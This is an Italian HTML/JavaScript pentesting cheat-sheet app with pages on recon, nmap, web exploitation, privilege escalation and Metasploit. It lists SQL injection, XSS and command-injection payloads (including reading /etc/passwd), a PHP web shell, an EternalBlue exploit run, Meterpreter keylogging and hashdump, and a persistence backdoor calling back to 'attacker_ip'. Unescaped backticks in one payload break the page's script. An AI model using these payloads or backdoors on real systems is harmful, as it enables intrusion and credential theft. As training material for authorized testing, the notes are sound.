<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pentesting Notes</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0e27;
            --bg-secondary: #151932;
            --bg-tertiary: #1e2339;
            --accent: #6366f1;
            --accent-hover: #818cf8;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --border: #2d3548;
            --shadow: rgba(0, 0, 0, 0.3);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            overflow-x: hidden;
        }

        .container {
            display: flex;
            height: 100vh;
        }

        /* SIDEBAR */
        .sidebar {
            width: 280px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .sidebar-header {
            padding: 24px 20px;
            border-bottom: 1px solid var(--border);
        }

        .sidebar-header h1 {
            font-size: 20px;
            color: var(--accent);
            font-weight: 600;
        }

        .sidebar-nav {
            flex: 1;
            padding: 16px 0;
        }

        .nav-section {
            margin-bottom: 24px;
        }

        .nav-section-title {
            padding: 8px 20px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            font-weight: 600;
        }

        .nav-item {
            padding: 10px 20px;
            cursor: pointer;
            transition: all 0.2s;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-item:hover {
            background: var(--bg-tertiary);
            color: var(--text-primary);
        }

        .nav-item.active {
            background: var(--bg-tertiary);
            color: var(--accent);
            border-left: 3px solid var(--accent);
        }

        .nav-item-icon {
            width: 18px;
            height: 18px;
        }

        /* MAIN CONTENT */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* TOPBAR */
        .topbar {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border);
            padding: 16px 32px;
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .search-container {
            flex: 1;
            max-width: 600px;
            position: relative;
        }

        .search-input {
            width: 100%;
            padding: 12px 16px 12px 44px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 14px;
            transition: all 0.2s;
        }

        .search-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .search-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-secondary);
        }

        /* CONTENT AREA */
        .content-area {
            flex: 1;
            overflow-y: auto;
            padding: 32px 48px;
        }

        .content-wrapper {
            max-width: 900px;
            margin: 0 auto;
        }

        .page-title {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 8px;
            color: var(--text-primary);
        }

        .page-meta {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 32px;
        }

        .content h2 {
            font-size: 24px;
            margin-top: 32px;
            margin-bottom: 16px;
            color: var(--text-primary);
            border-bottom: 2px solid var(--border);
            padding-bottom: 8px;
        }

        .content h3 {
            font-size: 20px;
            margin-top: 24px;
            margin-bottom: 12px;
            color: var(--accent-hover);
        }

        .content p {
            line-height: 1.7;
            margin-bottom: 16px;
            color: var(--text-secondary);
        }

        .content ul, .content ol {
            margin-left: 24px;
            margin-bottom: 16px;
            color: var(--text-secondary);
        }

        .content li {
            margin-bottom: 8px;
            line-height: 1.6;
        }

        .content code {
            background: var(--bg-tertiary);
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: var(--accent-hover);
        }

        .content pre {
            background: var(--bg-tertiary);
            padding: 16px;
            border-radius: 8px;
            overflow-x: auto;
            margin-bottom: 16px;
            border: 1px solid var(--border);
        }

        .content pre code {
            background: none;
            padding: 0;
            color: var(--text-primary);
        }

        .content blockquote {
            border-left: 4px solid var(--accent);
            padding-left: 16px;
            margin: 16px 0;
            color: var(--text-secondary);
            font-style: italic;
        }

        /* WELCOME PAGE */
        .welcome-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 32px;
            margin-bottom: 24px;
            box-shadow: 0 4px 6px var(--shadow);
        }

        .welcome-card h2 {
            border: none;
            margin-top: 0;
            color: var(--accent);
        }

        /* SCROLLBAR */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-secondary);
        }

        /* RESPONSIVE */
        @media (max-width: 768px) {
            .sidebar {
                position: fixed;
                left: -280px;
                z-index: 1000;
                transition: left 0.3s;
            }

            .sidebar.open {
                left: 0;
            }

            .content-area {
                padding: 24px 20px;
            }
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- SIDEBAR -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <h1>🛡️ Pentesting Notes</h1>
            </div>
            <nav class="sidebar-nav">
                <div class="nav-section">
                    <div class="nav-section-title">Getting Started</div>
                    <div class="nav-item active" data-page="home">
                        <span class="nav-item-icon">🏠</span>
                        <span>Home</span>
                    </div>
                </div>

                <div class="nav-section">
                    <div class="nav-section-title">Reconnaissance</div>
                    <div class="nav-item" data-page="recon-passive">
                        <span class="nav-item-icon">🔍</span>
                        <span>Passive Recon</span>
                    </div>
                    <div class="nav-item" data-page="recon-active">
                        <span class="nav-item-icon">🎯</span>
                        <span>Active Recon</span>
                    </div>
                </div>

                <div class="nav-section">
                    <div class="nav-section-title">Scanning</div>
                    <div class="nav-item" data-page="scanning-nmap">
                        <span class="nav-item-icon">📡</span>
                        <span>Nmap Scanning</span>
                    </div>
                    <div class="nav-item" data-page="scanning-vuln">
                        <span class="nav-item-icon">🐛</span>
                        <span>Vulnerability Scanning</span>
                    </div>
                </div>

                <div class="nav-section">
                    <div class="nav-section-title">Exploitation</div>
                    <div class="nav-item" data-page="exploit-web">
                        <span class="nav-item-icon">🌐</span>
                        <span>Web Exploitation</span>
                    </div>
                    <div class="nav-item" data-page="exploit-priv">
                        <span class="nav-item-icon">⬆️</span>
                        <span>Privilege Escalation</span>
                    </div>
                </div>

                <div class="nav-section">
                    <div class="nav-section-title">Tools</div>
                    <div class="nav-item" data-page="tools-metasploit">
                        <span class="nav-item-icon">🔧</span>
                        <span>Metasploit</span>
                    </div>
                    <div class="nav-item" data-page="tools-burp">
                        <span class="nav-item-icon">🕷️</span>
                        <span>Burp Suite</span>
                    </div>
                </div>
            </nav>
        </aside>

        <!-- MAIN CONTENT -->
        <main class="main-content">
            <!-- TOPBAR -->
            <div class="topbar">
                <div class="search-container">
                    <svg class="search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="11" cy="11" r="8"></circle>
                        <path d="m21 21-4.35-4.35"></path>
                    </svg>
                    <input type="text" class="search-input" id="searchInput" placeholder="Cerca negli appunti...">
                </div>
            </div>

            <!-- CONTENT AREA -->
            <div class="content-area">
                <div class="content-wrapper">
                    <div id="pageContent">
                        <!-- CONTENUTO DINAMICO -->
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        // DATABASE DELLE PAGINE
        const pages = {
            home: {
                title: 'Benvenuto nelle Pentesting Notes',
                meta: 'Documentazione completa per penetration testing',
                content: `
                    <div class="welcome-card">
                        <h2>👋 Benvenuto!</h2>
                        <p>Questa è la tua raccolta di appunti per il penetration testing. Qui troverai guide, comandi, tecniche e best practices per condurre test di sicurezza efficaci.</p>
                    </div>

                    <div class="welcome-card">
                        <h2>📚 Categorie Principali</h2>
                        <ul>
                            <li><strong>Reconnaissance</strong> - Tecniche di raccolta informazioni passive e attive</li>
                            <li><strong>Scanning</strong> - Port scanning, vulnerability assessment, enumeration</li>
                            <li><strong>Exploitation</strong> - Tecniche di sfruttamento vulnerabilità</li>
                            <li><strong>Tools</strong> - Guide per i principali strumenti di pentesting</li>
                        </ul>
                    </div>

                    <div class="welcome-card">
                        <h2>🚀 Come Iniziare</h2>
                        <p>Usa il menu laterale per navigare tra le diverse sezioni. La barra di ricerca in alto ti permette di trovare rapidamente argomenti specifici.</p>
                    </div>
                `
            },
            'recon-passive': {
                title: 'Passive Reconnaissance',
                meta: 'Tecniche di raccolta informazioni senza interagire direttamente con il target',
                content: `
                    <h2>Introduzione</h2>
                    <p>La reconnaissance passiva consiste nel raccogliere informazioni sul target senza interagire direttamente con i suoi sistemi.</p>

                    <h2>OSINT - Open Source Intelligence</h2>
                    <h3>Strumenti Principali</h3>
                    <ul>
                        <li><strong>Google Dorking</strong> - Ricerche avanzate con operatori Google</li>
                        <li><strong>Shodan</strong> - Motore di ricerca per dispositivi IoT</li>
                        <li><strong>theHarvester</strong> - Raccolta email, domini, IP</li>
                        <li><strong>Maltego</strong> - Visualizzazione relazioni tra entità</li>
                    </ul>

                    <h3>Comandi Utili</h3>
                    <pre><code># theHarvester per email e subdomain
theHarvester -d example.com -b google,bing

# Whois lookup
whois example.com

# DNS enumeration
dig example.com ANY
nslookup example.com</code></pre>

                    <h2>Google Dorks Utili</h2>
                    <pre><code>site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"</code></pre>

                    <h2>Note Importanti</h2>
                    <blockquote>
                        Assicurati sempre di avere l'autorizzazione prima di condurre qualsiasi attività di reconnaissance su un target.
                    </blockquote>
                `
            },
            'recon-active': {
                title: 'Active Reconnaissance',
                meta: 'Tecniche di scansione attiva e interazione con il target',
                content: `
                    <h2>Introduzione</h2>
                    <p>La reconnaissance attiva implica l'interazione diretta con i sistemi del target per raccogliere informazioni.</p>

                    <h2>DNS Enumeration</h2>
                    <pre><code># Zone transfer
dig axfr @nameserver example.com

# Subdomain brute force
dnsrecon -d example.com -D subdomains.txt -t brt

# Fierce
fierce -dns example.com</code></pre>

                    <h2>Port Scanning Basics</h2>
                    <pre><code># Quick scan
nmap -F target.com

# Full TCP scan
nmap -p- target.com

# Service version detection
nmap -sV target.com</code></pre>

                    <h2>Web Application Discovery</h2>
                    <ul>
                        <li>Directory enumeration con <code>gobuster</code> o <code>dirbuster</code></li>
                        <li>Identificazione CMS e tecnologie</li>
                        <li>Analisi robots.txt e sitemap.xml</li>
                    </ul>
                `
            },
            'scanning-nmap': {
                title: 'Nmap Scanning Guide',
                meta: 'Guida completa all\'uso di Nmap per port scanning',
                content: `
                    <h2>Introduzione a Nmap</h2>
                    <p>Nmap è lo standard de facto per il port scanning e la network discovery.</p>

                    <h2>Tipi di Scan</h2>
                    <h3>TCP Scans</h3>
                    <pre><code># TCP Connect Scan
nmap -sT target.com

# SYN Scan (stealth)
nmap -sS target.com

# Full TCP port scan
nmap -sS -p- target.com</code></pre>

                    <h3>UDP Scans</h3>
                    <pre><code># UDP Scan
nmap -sU target.com

# Top UDP ports
nmap -sU --top-ports 20 target.com</code></pre>

                    <h2>Service Detection</h2>
                    <pre><code># Version detection
nmap -sV target.com

# Aggressive detection
nmap -A target.com

# OS detection
nmap -O target.com</code></pre>

                    <h2>NSE Scripts</h2>
                    <pre><code># Default scripts
nmap -sC target.com

# Vuln scripts
nmap --script vuln target.com

# Specific script
nmap --script http-enum target.com</code></pre>

                    <h2>Output Options</h2>
                    <pre><code># All formats
nmap -oA outputfile target.com

# XML output
nmap -oX scan.xml target.com

# Grepable output
nmap -oG scan.gnmap target.com</code></pre>
                `
            },
            'scanning-vuln': {
                title: 'Vulnerability Scanning',
                meta: 'Tools e tecniche per vulnerability assessment',
                content: `
                    <h2>Vulnerability Scanners</h2>
                    
                    <h3>Nessus</h3>
                    <p>Scanner commerciale completo per vulnerability assessment.</p>

                    <h3>OpenVAS</h3>
                    <p>Alternative open source a Nessus.</p>
                    <pre><code># Avvio OpenVAS
gvm-start

# Creazione target e scan via web interface
# https://localhost:9392</code></pre>

                    <h3>Nikto</h3>
                    <p>Scanner per web server vulnerabilities.</p>
                    <pre><code># Basic scan
nikto -h http://target.com

# Con tuning
nikto -h target.com -Tuning 123bde</code></pre>

                    <h2>Manual Vulnerability Testing</h2>
                    <ul>
                        <li>Verifica versioni software obsolete</li>
                        <li>Test configurazioni di default</li>
                        <li>Ricerca CVE note per le versioni identificate</li>
                    </ul>
                `
            },
            'exploit-web': {
                title: 'Web Application Exploitation',
                meta: 'Tecniche di exploitation per applicazioni web',
                content: `
                    <h2>Common Web Vulnerabilities</h2>

                    <h3>SQL Injection</h3>
                    <pre><code># Basic test
' OR '1'='1

# Union based
' UNION SELECT NULL,NULL,NULL--

# sqlmap
sqlmap -u "http://target.com/page?id=1" --dbs</code></pre>

                    <h3>Cross-Site Scripting (XSS)</h3>
                    <pre><code># Reflected XSS
<script>alert('XSS')</script>

# DOM-based
<img src=x onerror=alert('XSS')>

# Stored XSS
<svg onload=alert('XSS')></code></pre>

                    <h3>Command Injection</h3>
                    <pre><code># Basic test
; ls
| whoami
` cat /etc/passwd `</code></pre>

                    <h2>File Upload Vulnerabilities</h2>
                    <ul>
                        <li>Bypass extension filtering</li>
                        <li>Upload web shells</li>
                        <li>Magic bytes manipulation</li>
                    </ul>

                    <h3>PHP Web Shell</h3>
                    <pre><code><?php system($_GET['cmd']); ?></code></pre>
                `
            },
            'exploit-priv': {
                title: 'Privilege Escalation',
                meta: 'Tecniche per l\'escalation dei privilegi su sistemi compromessi',
                content: `
                    <h2>Linux Privilege Escalation</h2>

                    <h3>Enumeration</h3>
                    <pre><code># System info
uname -a
cat /etc/issue

# User info
id
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null</code></pre>

                    <h3>Common Techniques</h3>
                    <ul>
                        <li><strong>SUID binaries</strong> - Sfruttamento di binari con bit SUID</li>
                        <li><strong>Sudo misconfiguration</strong> - Comandi eseguibili come root</li>
                        <li><strong>Kernel exploits</strong> - Exploit per vulnerabilità del kernel</li>
                        <li><strong>Cron jobs</strong> - Script eseguiti come root</li>
                    </ul>

                    <h2>Windows Privilege Escalation</h2>

                    <h3>Enumeration</h3>
                    <pre><code># System info
systeminfo
whoami /priv

# Services
sc query

# Scheduled tasks
schtasks /query /fo LIST /v</code></pre>

                    <h3>Tools</h3>
                    <ul>
                        <li><strong>WinPEAS</strong> - Automated enumeration</li>
                        <li><strong>PowerUp</strong> - PowerShell privilege escalation</li>
                        <li><strong>Mimikatz</strong> - Credential dumping</li>
                    </ul>
                `
            },
            'tools-metasploit': {
                title: 'Metasploit Framework',
                meta: 'Guida all\'uso del Metasploit Framework',
                content: `
                    <h2>Introduzione a Metasploit</h2>
                    <p>Metasploit è il framework di exploitation più utilizzato nel pentesting.</p>

                    <h2>Comandi Base</h2>
                    <pre><code># Avvio msfconsole
msfconsole

# Ricerca exploit
search type:exploit platform:windows

# Utilizzo exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target_ip
set LHOST attacker_ip
exploit</code></pre>

                    <h2>Meterpreter</h2>
                    <pre><code># Comandi Meterpreter
sysinfo
getuid
ps
migrate <PID>
hashdump
screenshot
keyscan_start
keyscan_dump</code></pre>

                    <h2>Post-Exploitation</h2>
                    <pre><code># Persistence
run persistence -X -i 10 -p 4444 -r attacker_ip

# Privilege escalation
getsystem

# Pivoting
route add subnet netmask session_id</code></pre>
                `
            },
            'tools-burp': {
                title: 'Burp Suite',
                meta: 'Guida all\'uso di Burp Suite per web app testing',
                content: `
                    <h2>Introduzione a Burp Suite</h2>
                    <p>Burp Suite è lo strumento standard per il testing di applicazioni web.</p>

                    <h2>Configurazione</h2>
                    <ul>
                        <li>Configurare il browser per usare il proxy (127.0.0.1:8080)</li>
                        <li>Importare il certificato CA di Burp nel browser</li>
                        <li>Abilitare l'intercettazione in Proxy → Intercept</li>
                    </ul>

                    <h2>Funzionalità Principali</h2>

                    <h3>Proxy</h3>
                    <p>Intercettazione e modifica delle richieste HTTP/HTTPS in tempo reale.</p>

                    <h3>Repeater</h3>
                    <p>Invio manuale di richieste modificate per test specifici.</p>

                    <h3>Intruder</h3>
                    <p>Automated attacks: brute force, fuzzing, parameter manipulation.</p>

                    <h3>Scanner (Pro)</h3>
                    <p>Scansione automatica per vulnerabilità comuni.</p>

                    <h2>Tecniche Utili</h2>
                    <ul>
                        <li>Match and Replace per modifiche automatiche</li>
                        <li>Session handling per gestire autenticazione</li>
                        <li>Scope definition per limitare il testing</li>
                        <li>Extensions per funzionalità aggiuntive</li>
                    </ul>
                `
            }
        };

        // FUNZIONE PER CARICARE UNA PAGINA
        function loadPage(pageId) {
            const page = pages[pageId];
            if (!page) return;

            const contentDiv = document.getElementById('pageContent');
            contentDiv.innerHTML = `
                <h1 class="page-title">${page.title}</h1>
                <div class="page-meta">${page.meta}</div>
                <div class="content">
                    ${page.content}
                </div>
            `;

            // Update active nav item
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
                if (item.dataset.page === pageId) {
                    item.classList.add('active');
                }
            });

            // Scroll to top
            document.querySelector('.content-area').scrollTop = 0;
        }

        // EVENT LISTENERS
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', () => {
                loadPage(item.dataset.page);
            });
        });

        // SEARCH FUNCTIONALITY
        const searchInput = document.getElementById('searchInput');
        searchInput.addEventListener('input', (e) => {
            const query = e.target.value.toLowerCase();
            
            document.querySelectorAll('.nav-item').forEach(item => {
                const text = item.textContent.toLowerCase();
                if (text.includes(query)) {
                    item.style.display = 'flex';
                } else {
                    item.style.display = query ? 'none' : 'flex';
                }
            });
        });

        // LOAD HOME PAGE ON START
        loadPage('home');
    </script>
</body>
</html>
